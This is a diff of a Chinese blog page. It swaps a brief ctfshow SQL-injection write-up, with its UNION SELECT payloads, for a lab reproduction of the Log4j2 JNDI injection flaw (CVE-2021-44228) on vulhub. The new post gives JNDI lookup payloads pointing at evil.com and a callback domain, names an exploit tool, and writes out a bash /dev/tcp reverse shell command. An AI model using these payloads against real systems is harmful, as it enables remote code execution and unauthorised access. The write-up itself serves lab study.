@@ -16,26 +16,29 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="John Doe">
+  <meta name="author" content="MaskObito">
   <meta name="keywords" content="">
   
-    <meta name="description" content="无过滤注入web171  闭合单引号：通过输入&#39;闭合id参数的单引号。 注入UNION查询：使用UNION SELECT获取其他数据，确保列数与原查询一致。 绕过原查询条件：直接查询username为’flag’的记录，因为UNION后的SELECT不受原查询的username !&#x3D; &#39;flag&#39;限制。 注释剩余部分：使用--注释掉原SQL的剩余部分，避免语法错误。  观察">
+    <meta name="description" content="Log4j2的JNDI注入漏洞复现参考文章： https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;316143.html https:&#x2F;&#x2F;www.cnblogs.com&#x2F;0dot7&#x2F;p&#x2F;17259327.html 漏洞描述关于Log4j2Log4j2是一个Java日志组件，被各类Java框架广泛地使用。它的前身是Log4j，Log4j2重新构建和设计了框架，可以认为两者是完全独立的两个日志组">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MaskObito">
-<meta property="og:url" content="http://maskobito.github.io/2025/06/02/%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:title" content="Log4j2的JNDI注入漏洞复现">
+<meta property="og:url" content="http://maskobito.github.io/2025/06/01/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="MaskObito">
-<meta property="og:description" content="无过滤注入web171  闭合单引号：通过输入&#39;闭合id参数的单引号。 注入UNION查询：使用UNION SELECT获取其他数据，确保列数与原查询一致。 绕过原查询条件：直接查询username为’flag’的记录，因为UNION后的SELECT不受原查询的username !&#x3D; &#39;flag&#39;限制。 注释剩余部分：使用--注释掉原SQL的剩余部分，避免语法错误。  观察">
+<meta property="og:description" content="Log4j2的JNDI注入漏洞复现参考文章： https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;316143.html https:&#x2F;&#x2F;www.cnblogs.com&#x2F;0dot7&#x2F;p&#x2F;17259327.html 漏洞描述关于Log4j2Log4j2是一个Java日志组件，被各类Java框架广泛地使用。它的前身是Log4j，Log4j2重新构建和设计了框架，可以认为两者是完全独立的两个日志组">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://maskobito.github.io/images/web171.jpg">
-<meta property="article:published_time" content="2025-06-02T07:00:07.345Z">
-<meta property="article:modified_time" content="2025-06-02T07:27:05.185Z">
+<meta property="og:image" content="http://maskobito.github.io/%5Cimages%5CLog4j2-1.png">
+<meta property="og:image" content="http://maskobito.github.io/%5Cimages%5CLog4j2-2.png">
+<meta property="og:image" content="http://maskobito.github.io/%5Cimages%5CLog4j2-3.png">
+<meta property="og:image" content="http://maskobito.github.io/%5Cimages%5CLog4j2-4.png">
+<meta property="article:published_time" content="2025-06-01T15:13:11.000Z">
+<meta property="article:modified_time" content="2025-06-18T08:30:11.993Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://maskobito.github.io/images/web171.jpg">
+<meta name="twitter:image" content="http://maskobito.github.io/%5Cimages%5CLog4j2-1.png">
   
   
   
-  <title>MaskObito</title>
+  <title>Log4j2的JNDI注入漏洞复现 - MaskObito</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -205,7 +208,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text=""></span>
+            <span id="subtitle" data-typed-text="Log4j2的JNDI注入漏洞复现"></span>
           
         </div>
 
@@ -216,8 +219,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-06-02 15:00" pubdate>
-          2025年6月2日 下午
+        <time datetime="2025-06-01 23:13" pubdate>
+          2025年6月1日 晚上
         </time>
       </span>
     
@@ -228,7 +231,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          156 字
+          1.1k 字
         
       </span>
     
@@ -239,7 +242,7 @@
         
         
         
-          2 分钟
+          9 分钟
         
       </span>
     
@@ -276,24 +279,65 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header"></h1>
+            <h1 id="seo-header">Log4j2的JNDI注入漏洞复现</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="无过滤注入"><a href="#无过滤注入" class="headerlink" title="无过滤注入"></a>无过滤注入</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p><img src="/images/web171.jpg" srcset="/img/loading.gif" lazyload></p>
+                <h1 id="Log4j2的JNDI注入漏洞复现"><a href="#Log4j2的JNDI注入漏洞复现" class="headerlink" title="Log4j2的JNDI注入漏洞复现"></a>Log4j2的JNDI注入漏洞复现</h1><p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/316143.html">https://www.freebuf.com/vuls/316143.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0dot7/p/17259327.html">https://www.cnblogs.com/0dot7/p/17259327.html</a></p>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><h3 id="关于Log4j2"><a href="#关于Log4j2" class="headerlink" title="关于Log4j2"></a>关于Log4j2</h3><p>Log4j2是一个Java日志组件，被各类Java框架广泛地使用。它的前身是Log4j，Log4j2重新构建和设计了框架，可以认为两者是完全独立的两个日志组件，但是因为存在前身Log4j，而且都是Apache下的项目，不管是jar包名称还是package名称，看起来都很相似</p>
+<h3 id="Log4j2-Lookup"><a href="#Log4j2-Lookup" class="headerlink" title="Log4j2 Lookup"></a>Log4j2 Lookup</h3><p>Log4j2的Lookup允许在日志配置和日志消息中动态插入变量值，这些变量可以是外部环境变量，也可以是MDC中的变量，还可以是日志上下文数据等。</p>
+<p>格式类似”${type:var}”，即可以实现对变量var的引用。type可以是如下值：</p>
 <ol>
-<li><strong>闭合单引号</strong>：通过输入<code>&#39;</code>闭合id参数的单引号。</li>
-<li><strong>注入UNION查询</strong>：使用<code>UNION SELECT</code>获取其他数据，确保列数与原查询一致。</li>
-<li><strong>绕过原查询条件</strong>：直接查询username为’flag’的记录，因为UNION后的SELECT不受原查询的<code>username != &#39;flag&#39;</code>限制。</li>
-<li><strong>注释剩余部分</strong>：使用<code>--</code>注释掉原SQL的剩余部分，避免语法错误。</li>
+<li>ctx：允许程序将数据存储在 Log4j <code>ThreadContext</code>Map 中，然后在日志输出过程中，查找其中的值。</li>
+<li>env：允许系统在全局文件（如 &#x2F;etc&#x2F;profile）或应用程序的启动脚本中配置环境变量，然后在日志输出过程中，查找这些变量。例如：<code>$&#123;env:USER&#125;</code>。</li>
+<li>java：允许查找Java环境配置信息。例如：<code>$&#123;java:version&#125;</code>。</li>
+<li>jndi：允许通过 JNDI 检索变量。</li>
+<li>…</li>
 </ol>
-<p>观察到有三列，两种解发均可，后者会带出id&#x3D;1的那一行，没啥作用</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; union select username,password,1 from ctfshow_user where username=&#x27;</span>flag<span class="hljs-string">&#x27; -- </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> username,password,<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure>
+<p>这次漏洞就跟jndi有关，我们接下来了解一下jndi注入的漏洞成因</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>JNDI（Java Naming and Directory  Interface，Java命名和目录接口），是Java提供的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象 。</p>
+<p>JNDI还支持从指定的远程服务器上下载class文件，加载到本地JVM中，并通过适当的方式创建对象。这里就是漏洞的主要来源</p>
+<p>由于Log4j 的 JNDI 支持并没有限制可以解析的名称。一些协议像rmi:和ldap:是不安全的或者可以允许远程代码执行。攻击者在可以控制日志内容的情况下，通过传入类似于<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的lookup用于进行JNDI注入，执行任意代码。</p>
+<p><strong><code>rmi:</code> 协议</strong></p>
+<ul>
+<li><strong>RMI（Remote Method Invocation）</strong> 是 Java 提供的远程方法调用机制，允许一个 Java 虚拟机（JVM）调用另一个 JVM 上的对象方法。</li>
+<li>在 Log4j2 漏洞中，攻击者可以通过 <code>rmi:</code> 协议指向一个恶意的 RMI 服务器，从而触发远程代码执行。</li>
+</ul>
+<p><strong><code>ldap:</code> 协议</strong></p>
+<ul>
+<li><strong>LDAP（Lightweight Directory Access Protocol）</strong> 是一种用于访问目录服务的协议，常用于企业中的身份验证和资源管理。</li>
+<li>在 Log4j2 漏洞中，攻击者可以通过 <code>ldap:</code> 协议指向一个恶意的 LDAP 服务器，返回一个恶意类或序列化对象，从而触发远程代码执行。</li>
+</ul>
+<p>我们举个例子</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$&#123;</span><span class="hljs-symbol">jndi:</span><span class="hljs-symbol">ldap:</span>/<span class="hljs-regexp">/127.0.0.1/shell</span>&#125;<br></code></pre></td></tr></table></figure>
 
+<p>当我们传入这个字符串的时候，log4j2组件就会将信息记录到日志中，并且log4j2会尝试解析这些信息，通过jndi的lookup()方法去解析该URL：ldap:&#x2F;&#x2F;127.0.0.1&#x2F;shell，由于是ldap协议，所以就会去该地址下的ldap服务中寻找名为shell的资源，找到后将资源信息返回给组件，之后log4j2组件就会下载下来，假如我们的shell文件的一个恶意的.class文件，那就会执行里面的代码，从而造成注入</p>
+<h2 id="环境搭建-漏洞复现"><a href="#环境搭建-漏洞复现" class="headerlink" title="环境搭建&amp;漏洞复现"></a>环境搭建&amp;漏洞复现</h2><p>vulhub靶场有现成的环境</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> vulhub/log4j/CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">44228</span>/<br><span class="hljs-attribute">docker</span>-compose up -d<br></code></pre></td></tr></table></figure>
 
+<p>使用vulhub靶场，启动一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1</p>
+<p>起环境后访问8983端口</p>
+<p><img src="/%5Cimages%5CLog4j2-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后我们对网站进行测试，用一个dns服务器起一个域名，这里我用yakit的dns服务器</p>
+<p><img src="/%5Cimages%5CLog4j2-2.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span>&#123;jndi:ldap:<span class="hljs-comment">//wsythhvyqt.dgrh3.cn&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p> <strong>注释符的区别</strong></p>
+<p>利用JNDI发送DNS请求的Payload，并且在dns服务器上成功收到回显</p>
+<p>然后就是漏洞利用了</p>
+<p>使用JNDI注入工具</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">工具地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/welk1n/</span>JNDI-Injection-Exploit<br></code></pre></td></tr></table></figure>
+
+<p>然后我们构造反弹shell</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/vps.ip/port <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>然后用工具进行注入</p>
+<p><img src="/%5Cimages%5CLog4j2-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>我这里版本是jdk1.8的，所以直接传就行，然后监听端口就可以收到了</p>
+<p><img src="/%5Cimages%5CLog4j2-4.png" srcset="/img/loading.gif" lazyload></p>
+<p>到此靶场的复现就完成了</p>
 
                 
               </div>
@@ -311,20 +355,20 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div></div>
-      <div>http://maskobito.github.io/2025/06/02/测试/</div>
+      <div>Log4j2的JNDI注入漏洞复现</div>
+      <div>http://maskobito.github.io/2025/06/01/Log4j2的JNDI注入漏洞复现/</div>
     </div>
     <div class="license-meta">
       
         <div class="license-meta-item">
           <div>作者</div>
-          <div>John Doe</div>
+          <div>MaskObito</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年6月2日</div>
+          <div>2025年6月1日</div>
         </div>
       
       
@@ -366,8 +410,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/05/29/hello-world/" title="Hello World">
-                        <span class="hidden-mobile">Hello World</span>
+                      <a href="/2025/05/30/ISCC2025/" title="ISCC2025">
+                        <span class="hidden-mobile">ISCC2025</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
